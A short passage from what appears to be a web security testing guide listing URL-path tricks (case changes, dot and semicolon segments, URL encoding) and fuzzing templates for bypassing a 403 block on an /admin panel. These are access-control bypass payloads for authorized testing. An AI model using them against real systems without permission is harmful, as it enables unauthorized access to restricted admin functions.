

**URL Manipulation:** To test you can see following test case to bypass this type of restrictions. Now for understanding let’s say admin panel is restricted to access so we can use following test cases to bypass this restriction.

```bash
· /admin -> 403
· /Admin -> 200
· /AdMin -> 200
· /admin/ -> 200
· /admin/. -> 200
· //admin// -> 200
· /.;/admin -> 200
· /./admin/.. -> 200
· /admin.json -> 200
· /;/admin -> 200
· //;//admin -> 200
· /admi%6e -> 200 [n is url encoded to %6e]
· /%2e/admin -> 200
· /admin..;/ -> 200
```

**You can also do fuzzing to this endpoints like this:**
```bash
 /FUZZ/admin
 /admin/FUZZ
 /adminFUZZ
```
